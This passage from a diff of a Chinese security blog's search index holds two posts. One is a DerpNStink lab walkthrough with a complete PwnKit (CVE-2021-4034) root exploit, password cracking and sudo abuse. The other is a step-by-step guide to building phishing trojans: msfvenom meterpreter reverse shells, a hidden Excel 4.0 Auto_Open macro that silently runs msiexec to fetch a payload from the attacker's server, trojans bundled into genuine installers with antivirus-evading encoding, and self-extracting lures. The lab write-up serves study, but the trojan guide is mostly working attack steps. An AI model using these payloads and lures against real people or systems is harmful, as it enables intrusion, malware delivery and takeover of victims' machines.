class="string">b&#x27;/usr/bin/pkexec&#x27;</span>,c_char_p(<span class="literal">None</span>) ,env)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="收集笔记"><a class="header-anchor" href="#收集笔记">¶</a>收集笔记</h3><ul><li><p>ip:192.168.56.10</p></li><li><p>域名: derpnstink.local</p></li><li><p>网站信息/路径:</p><p>wordpress</p><p>/weblog/wp-admin</p><p>/php/phpmyadmin</p></li><li><p>账密:ssh/su:  mrderp / derpderpderpderpderpderpderpftp/su: stinky / wedgie57</p></li></ul>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>DerpNStink: 1</h1><hr><p>No.4</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">vulnhub靶场-DerpNStink:1</a></p><p>目标: attack the VM and find all 4 flags eventually leading you to full root access</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.6</li><li>ubuntu: 192.168.56.10</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.10</span><br><span class="line">nmap -sC -sV -p- -v -A 192.168.56.10</span><br></pre></td></tr></table></figure><p>结合工具以及访问网页, 可以收集一些信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 端口: </span></span><br><span class="line">21,22,80,3306</span><br><span class="line"><span class="comment"># 中间件: </span></span><br><span class="line">apache/2.4.7</span><br><span class="line">MySQL</span><br><span class="line">jQuery</span><br><span class="line">PHP</span><br><span class="line"><span class="comment"># 操作系统: </span></span><br><span class="line">Ubuntu 2ubuntu2.8</span><br><span class="line"><span class="comment"># cms: </span></span><br><span class="line">WordPres</span><br></pre></td></tr></table></figure><p>直接访问80端口, 可以在网页中搜索找到flag1, 还找到一个<code>/webnotes/info.txt</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240924204439528.png" alt="image-20240924204439528"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --&gt; </span><br><span class="line"># 需要修改host文件</span><br></pre></td></tr></table></figure><p>WordPress后台有弱密码, 账号密码均为<code>admin</code></p><p>先配置hosts文件, 你问我网址怎么来的, 我说windows登录后得到的, 或者linux访问<code>/weblog/wp-admin</code>得到的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.56.10    derpnstink.local</span><br></pre></td></tr></table></figure><p>进行目录扫描:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/php/phpmyadmin</span><br><span class="line">/robots.txt</span><br><span class="line">/temporary/        # 仅仅输出try harder</span><br><span class="line">/weblog</span><br><span class="line">/weblog/wp-admin</span><br><span class="line">/webnotes</span><br></pre></td></tr></table></figure><p>利用漏洞扫描工具进一步扫描(kali自带的wpscan), 搜索漏洞:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://derpnstink.local/weblog/</span><br><span class="line"><span class="comment"># 找到过时插件: slideshow-gallery 1.4.8</span></span><br><span class="line"><span class="comment"># 有cms主题 twentysixteen</span></span><br><span class="line"></span><br><span class="line">search WordPress 4.6</span><br><span class="line"><span class="comment"># 这不一眼看到slideshowgallery_upload</span></span><br><span class="line"><span class="comment"># 我没有在搜索引擎找到对应的编号</span></span><br></pre></td></tr></table></figure><blockquote><p>搜索方式不对导致的, 应该搜索这个: wordpress slideshow exploit</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925193308091.png" alt="image-20240925193308091"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_slideshowgallery_upload</span><br><span class="line">set rhosts 192.168.56.10</span><br><span class="line">set targeturi /weblog</span><br><span class="line">set wp_password admin</span><br><span class="line">set wp_user admin</span><br><span class="line"># 记得看 lhost 是否正确, 下图就是因为没有设置 lhost 上传了一堆</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925194854979.png" alt="image-20240925194854979"></p><p>继续信息收集:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户 whoami</span></span><br><span class="line">www-data</span><br><span class="line"><span class="comment"># 系统内核 uname -a </span></span><br><span class="line">Linux DeRPnStiNK 4.4.0-31-generic <span class="comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="comment"># 环境</span></span><br><span class="line">gcc</span><br><span class="line"><span class="comment"># 配置文件 /var/www/html/weblog/wp-config.php</span></span><br><span class="line">mysql账密: root mysql</span><br><span class="line">库名: wordpress</span><br></pre></td></tr></table></figure><blockquote><p><code>lsb_release -a</code> 查看发行版本</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看有suid权限的文件</p></blockquote><p>进入mysql收集信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use wordpress</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure><p>可以找到最后一列是flag2, 但是没有值, 猜测是另一个账号登录获取flag2</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925200926303.png" alt="image-20240925200926303"></p><p>结果在<code>wp_posts</code>数据库中找到了flag2, 那挺好的</p><blockquote><p>爆破密钥的话可以利用kali的<code>john</code>工具, 将要爆破的写进pass.txt进行爆破; rockyou.txt可以去到这个目录下解压<code>rockyou.txt.gz</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># unclestinky/wedgie57  登录wordpress获得flag2</span></span><br></pre></td></tr></table></figure></blockquote><p>现在只剩下21和22没有试过了, 但是发现登录需要账号密码</p><p>获取用户名可以<code>cat /etc/passwd</code>, 也可以前往<code>/home</code>查看有谁的配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户: mrderp, stinky</span></span><br><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.10 ftp</span><br><span class="line"><span class="comment"># 爆破拿到ftp账密: stinky wedgie57</span></span><br></pre></td></tr></table></figure><blockquote><p>发现这一套账号密码也可以直接用于<code>su stinky</code></p><p>主要是我在ftp里面找不到东西</p></blockquote><p>利用<code>su stinky</code>登录对应账号, 在此权限下进入<code>/home/stinky/Desktop</code>找到flag.txt, 这是flag3</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925205624768.png" alt="image-20240925205624768"></p><p>三个都找到了, 结合靶机描述, 下一步我们应该提权</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><blockquote><p>耗时最久的一集</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 14.04, 测试半天没有任何收获</span><br></pre></td></tr></table></figure><p>遂用搜索引擎寻找新的方法: <a href="https://942178v2gb.k.topthink.com/@k7pl99lypy/Ubuntuneihetiquan.html">Ubuntu内核提权-Xe的库</a></p><p>已经测试的: <code>CVE-2017-16995</code>(45010.c), <code>CVE-2021-3493</code>(37292.c)</p><p>2021这么新都不行, 向后找<a href="http://1.13.190.198/2022/04/07/CVE-2021-4034/">CVE-2021-4034：Linux Polkit 权限提升漏洞复现以及修复</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.6:6789/cve-2021-4034.c</span><br><span class="line"><span class="built_in">chmod</span> 777 cve-2021-4034.c</span><br><span class="line">gcc cve-2021-4034.c -o poc</span><br><span class="line"><span class="built_in">chmod</span> 777 poc</span><br><span class="line">./poc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145559032.png" alt="image-20240926145559032"></p><p>然后进入<code>/root</code>, 在Desktop下找到flag4, 圆满完成任务</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145704769.png" alt="image-20240926145704769"></p><h2 id="其他提权"><a class="header-anchor" href="#其他提权">¶</a>其他提权</h2><h3 id="内核提权"><a class="header-anchor" href="#内核提权">¶</a>内核提权</h3><p>内核版本为4.4.0, 该内核受脏牛漏洞影响, 后面不必多说</p><h3 id="非内核提权"><a class="header-anchor" href="#非内核提权">¶</a>非内核提权</h3><p>从Wordpress的配置文件wp-config中可以获取到数据库账密: <code>root:mysql</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看wordpress保存的用户</span><br><span class="line">select * from wp_users;</span><br><span class="line"># 有一个unclestinky令人在意</span><br><span class="line">select user_login,user_pass from wp_users;</span><br></pre></td></tr></table></figure><p>在<code>/etc/passwd</code>中存在一个用户stinky, 该命名相似度, 可以尝试破解这个密码并登录</p><p>将密码保存为key文件, 利用john进行爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john key -w=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到密码为<code>wedgie57</code>. 切换用户为stinky, 在用户的Documents目录下存在<code>derpissues.pcap</code>流量包, 进行流量分析</p><p>传递文件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali:</span></span><br><span class="line">nc -lvvp 1234 &gt; derpissues.pcap</span><br><span class="line"><span class="comment"># 靶机:</span></span><br><span class="line">nc -nv 192.168.56.6 1234 &lt; derpissues.pcap</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926152420545.png" alt="image-20240926152420545"></p><p>分析文件, 在http过滤器下找到No.5598数据包(POST, 而且是创建新用户)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wireshark derpissues.pcap</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926155413165.png" alt="image-20240926155413165"></p><p>尝试用这个密码去登录用户, 成功登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mrderp@192.168.56.10</span><br><span class="line">derpderpderpderpderpderpderp</span><br></pre></td></tr></table></figure><p>执行<code>sudo -l</code>, 发现可以执行特定路径下有sudo权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mrderp ALL=(ALL) /home/mrderp/binaries/derpy*</span><br></pre></td></tr></table></figure><p>也就是允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/目录下derpy开头的文件</p><p>没有这个目录就去创建这个目录, 可以获取root权限; 或者可以弹个root权限的shell出去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> binaries</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; derpy.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 derpy.sh</span><br><span class="line">sudo ./derpy.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926183631782.png" alt="image-20240926183631782"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>去找了其他大佬的博客, 我们似乎用不同的方法跳过了不少步骤</p><h3 id="ftp中有公钥文件"><a class="header-anchor" href="#ftp中有公钥文件">¶</a>ftp中有公钥文件</h3><p>在<code>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</code>下有一个key.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get key.txt    # 下载到本地</span><br></pre></td></tr></table></figure><p>利用这个密钥可以登录前面找到的两个账户</p><p>如果出现<code>Permissions 0664 for 'key.txt' are too open</code>, 就把权限设为400</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 400 key.txt   <span class="comment"># -rwx</span></span><br><span class="line">ssh -i key.txt stinky@192.168.159.136 -o PubkeyAcceptedKeyTypes=+ssh-rsa</span><br><span class="line"><span class="comment"># 此处两个我都无法登录</span></span><br></pre></td></tr></table></figure><h3 id="ftp中还有聊天文件"><a class="header-anchor" href="#ftp中还有聊天文件">¶</a>ftp中还有聊天文件</h3><p><code>/files/network-logs/</code>下还有<code>derpissues.txt</code></p><p>在这里可以看到通过数据包捕获工具进行问题排查, 那就是排查我们的到的那个数据包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?</span><br><span class="line">12:07 stinky: yeah. did you need a password reset?</span><br><span class="line">12:07 mrderp: I think i accidently deleted my account</span><br><span class="line">12:07 mrderp: i just need to logon once to make a change</span><br><span class="line">12:07 stinky: im gonna packet capture so we can figure out whats going on</span><br><span class="line">12:07 mrderp: that seems a bit overkill, but wtv</span><br><span class="line">12:08 stinky: commence the sniffer!!!</span><br><span class="line">12:08 mrderp: -_-</span><br><span class="line">12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?</span><br><span class="line">12:11 mrderp: awesome it works!</span><br><span class="line">12:12 stinky: we really are the best sysadmins #team</span><br><span class="line">12:13 mrderp: i guess we are…</span><br><span class="line">12:15 mrderp: alright I made the changes, feel free to decomission my account</span><br><span class="line">12:20 stinky: done! yay</span><br></pre></td></tr></table></figure><h3 id="mrderp的Desktop下有提权方式"><a class="header-anchor" href="#mrderp的Desktop下有提权方式">¶</a>mrderp的Desktop下有提权方式</h3><p>有一个<code>helpdesk.log</code>, 里面有提示:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926160236163.png" alt="image-20240926160236163"></p><p>这个网址在访问后有一句话:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mrderp ALL=(ALL) /home/mrderp/binaries/derpy*</span><br></pre></td></tr></table></figure><h3 id="扒拉过来的py提权文件"><a class="header-anchor" href="#扒拉过来的py提权文件">¶</a>扒拉过来的py提权文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#  CVE-2021-4034</span></span><br><span class="line"><span class="comment">#  Ravindu Wickramasinghe (@rvizx9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"></span><br><span class="line">so=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void gconv() &#123;&#125;</span></span><br><span class="line"><span class="string">void gconv_init() &#123;</span></span><br><span class="line"><span class="string">    setuid(0);setgid(0);seteuid(0);setegid(0);</span></span><br><span class="line"><span class="string">    system(&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh&quot;);</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    os.system(<span class="string">&quot;mkdir -p &#x27;GCONV_PATH=.&#x27; pwnkit ; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;</span>)</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&quot;pwnkit/pwnkit.c&quot;</span>,<span class="string">&quot;w&quot;</span>) ; f.write(so) ;f.close()</span><br><span class="line">    os.system(<span class="string">&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;</span>)</span><br><span class="line">    envi=[<span class="string">b&quot;pwnkit&quot;</span>, <span class="string">b&quot;PATH=GCONV_PATH=.&quot;</span>,<span class="string">b&quot;CHARSET=PWNKIT&quot;</span>,<span class="string">b&quot;SHELL=pwnkit&quot;</span>,<span class="literal">None</span>]</span><br><span class="line">    env=(c_char_p * <span class="built_in">len</span>(envi))() ;env[:]=envi</span><br><span class="line">    libc = CDLL(find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">    libc.execve(<span class="string">b&#x27;/usr/bin/pkexec&#x27;</span>,c_char_p(<span class="literal">None</span>) ,env)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="收集笔记"><a class="header-anchor" href="#收集笔记">¶</a>收集笔记</h3><ul><li><p>ip:192.168.56.10</p></li><li><p>域名: derpnstink.local</p></li><li><p>网站信息/路径:</p><p>wordpress</p><p>/weblog/wp-admin</p><p>/php/phpmyadmin</p></li><li><p>账密:ssh/su:  mrderp / derpderpderpderpderpderpderpftp/su: stinky / wedgie57</p></li></ul>]]></content>
       
       
       <categories>
@@ -1157,17 +1261,17 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 爆破 </tag>
             
             <tag> 提权 </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> Linux </tag>
             
             <tag> msf </tag>
             
             <tag> MySQL </tag>
+            
+            <tag> 漏洞利用 </tag>
             
             <tag> 日志分析 </tag>
             
@@ -1252,15 +1356,15 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 爆破 </tag>
             
             <tag> 提权 </tag>
             
-            <tag> 漏洞利用 </tag>
+            <tag> Linux </tag>
             
             <tag> msf </tag>
+            
+            <tag> 漏洞利用 </tag>
             
         </tags>
       
@@ -1285,9 +1389,9 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1316,11 +1420,11 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 爆破 </tag>
             
             <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
             
             <tag> msf </tag>
             
@@ -1542,9 +1646,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> RCE </tag>
-            
             <tag> SQL注入 </tag>
+            
+            <tag> RCE </tag>
             
             <tag> SQL盲注 </tag>
             
@@ -1573,9 +1677,9 @@
             
             <tag> 文件上传 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1602,9 +1706,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1633,9 +1737,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1662,9 +1766,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1693,9 +1797,9 @@
             
             <tag> 工具利用 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1728,9 +1832,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1761,9 +1865,9 @@
             
             <tag> 工具利用 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1794,9 +1898,9 @@
             
             <tag> 工具利用 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1825,9 +1929,9 @@
       
         <tags>
             
-            <tag> 工具利用 </tag>
-            
             <tag> 爆破 </tag>
+            
+            <tag> 工具利用 </tag>
             
             <tag> PHP </tag>
             
@@ -1883,9 +1987,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -1986,9 +2090,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -2270,7 +2374,7 @@
       <link href="/article/simple-phishing-trojan/"/>
       <url>/article/simple-phishing-trojan/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="恶意Excel文件生成"><a class="header-anchor" href="#恶意Excel文件生成">¶</a>恶意Excel文件生成</h2><p>linux下, msf 生成恶意 msi 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -f msi -o shell.msi</span><br></pre></td></tr></table></figure><p>msf 建立监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.1</span><br><span class="line">set lport 10000</span><br><span class="line">run</span><br><span class="line">// 或 exploit -j持续监听</span><br></pre></td></tr></table></figure><p>python 在具有恶意的msi的文件夹下开启http服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>到 windows 下, 新建一个 Excel</p><p>想要查看文件后缀名进行如下修改:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330005121535.png" alt="image-20240330005121535"></p><p>打开后右键底部Sheet, 点击插入, 选择<code>MS Excel 4.0宏表</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=EXEC(&quot;msiexec /q /ihttp://192.168.10.1/shell.msi&quot;)// 第一格, 调用执行服务器上的dayu.msi文件</span><br><span class="line">=HALT()        // 第二格, 标识Excel 4.0宏结束</span><br></pre></td></tr></table></figure><p>第一格, 左上角的A1模式手动输入：<code>Auto_Open</code>，Enter回车<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330004527097.png" alt="image-20240330004527097"></p><p>右键底部<code>宏1</code>, 选择隐藏ctrl+s 保存, 弹出提示选择<code>否</code>, 弹出的另存为选择<code>Excel 启用宏的工作簿</code>, 后缀为<code>.xlsm</code></p><p>现在桌面上<code>.xlsm</code>就是伪装过的木马</p><p>打开后提示宏已经被禁用, 启用后就可以在Linux上发现连接上了<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330011728376.png" alt="image-20240330011728376"></p><h2 id="正常的软件和恶意木马打包"><a class="header-anchor" href="#正常的软件和恶意木马打包">¶</a>正常的软件和恶意木马打包</h2><h3 id="不免杀-msf-捆绑"><a class="header-anchor" href="#不免杀-msf-捆绑">¶</a>不免杀 msf 捆绑</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -e x86/shikata_ga_nai -i 15 -f exe -b &#x27;\x00\x0a\x0d&#x27; -x ~/Desktop/inst.exe &gt; ~/Desktop/Trojan/test_msf_360.exe</span><br><span class="line">// ~/Desktop/inst.exe 原来的软件 输出的是捆绑的木马软件</span><br><span class="line">// -e x86/shikata_ga_nai 选择一个常见的编码器，用于避免某些安全产品的检测</span><br><span class="line">// -i 15 指定迭代次数</span><br></pre></td></tr></table></figure><h3 id="自解压捆绑"><a class="header-anchor" href="#自解压捆绑">¶</a>自解压捆绑</h3><p>给虚拟机安装压缩软件 winrar</p><p>msf 生成木马, 利用 python 开启 http 服务让靶机下载 木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -f exe -o shell.php</span><br></pre></td></tr></table></figure><p>选中正常文件和木马, 右键选择<code>添加到压缩文件</code></p><p>在<code>常规</code>选项卡勾选穿创建自解压格式压缩文件, 在<code>高级</code>选项卡点击<code>自解压选项</code></p><p>新窗口中选择<code>设置</code>选项卡, 解压前运行填入木马, 解压后运行填入正常文件</p><p>运行自解压格式, 返回 linux 发现已经上线</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330014501882.png" alt="image-20240330014501882"></p>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>无外乎三种方式: 后缀隐藏, 文件免杀, 图标更换</p><h1>恶意Excel文件生成</h1><p>linux下, msf 生成恶意 msi 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -f msi -o shell.msi</span><br></pre></td></tr></table></figure><p>msf 建立监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.1</span><br><span class="line">set lport 10000</span><br><span class="line">run</span><br><span class="line">// 或 exploit -j持续监听</span><br></pre></td></tr></table></figure><p>python 在具有恶意的msi的文件夹下开启http服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>到 windows 下, 新建一个 Excel</p><p>想要查看文件后缀名进行如下修改:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330005121535.png" alt="image-20240330005121535"></p><p>打开后右键底部Sheet, 点击插入, 选择<code>MS Excel 4.0宏表</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=EXEC(&quot;msiexec /q /ihttp://192.168.10.1/shell.msi&quot;)// 第一格, 调用执行服务器上的dayu.msi文件</span><br><span class="line">=HALT()        // 第二格, 标识Excel 4.0宏结束</span><br></pre></td></tr></table></figure><p>第一格, 左上角的A1模式手动输入：<code>Auto_Open</code>，Enter回车<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330004527097.png" alt="image-20240330004527097"></p><p>右键底部<code>宏1</code>, 选择隐藏ctrl+s 保存, 弹出提示选择<code>否</code>, 弹出的另存为选择<code>Excel 启用宏的工作簿</code>, 后缀为<code>.xlsm</code></p><p>现在桌面上<code>.xlsm</code>就是伪装过的木马</p><p>打开后提示宏已经被禁用, 启用后就可以在Linux上发现连接上了<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330011728376.png" alt="image-20240330011728376"></p><h1>正常的软件和恶意木马打包</h1><h3 id="不免杀-msf-捆绑"><a class="header-anchor" href="#不免杀-msf-捆绑">¶</a>不免杀 msf 捆绑</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -e x86/shikata_ga_nai -i 15 -f exe -b &#x27;\x00\x0a\x0d&#x27; -x ~/Desktop/inst.exe &gt; ~/Desktop/Trojan/test_msf_360.exe</span><br><span class="line">// ~/Desktop/inst.exe 原来的软件 输出的是捆绑的木马软件</span><br><span class="line">// -e x86/shikata_ga_nai 选择一个常见的编码器，用于避免某些安全产品的检测</span><br><span class="line">// -i 15 指定迭代次数</span><br></pre></td></tr></table></figure><h3 id="自解压捆绑"><a class="header-anchor" href="#自解压捆绑">¶</a>自解压捆绑</h3><p>给虚拟机安装压缩软件 winrar</p><p>msf 生成木马, 利用 python 开启 http 服务让靶机下载 木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -f exe -o shell.php</span><br></pre></td></tr></table></figure><p>选中正常文件和木马, 右键选择<code>添加到压缩文件</code></p><p>在<code>常规</code>选项卡勾选穿创建自解压格式压缩文件, 在<code>高级</code>选项卡点击<code>自解压选项</code></p><p>新窗口中选择<code>设置</code>选项卡, 解压前运行填入木马, 解压后运行填入正常文件</p><p>运行自解压格式, 返回 linux 发现已经上线</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330014501882.png" alt="image-20240330014501882"></p><h1>利用Unicode控制字符伪装文件格式</h1><p>可以骗用户, 但是骗不了杀毒软件. 快捷的输入方法还得是win7, 改文件名的时候右键即可插入控制字符</p><p>用qq的知道, 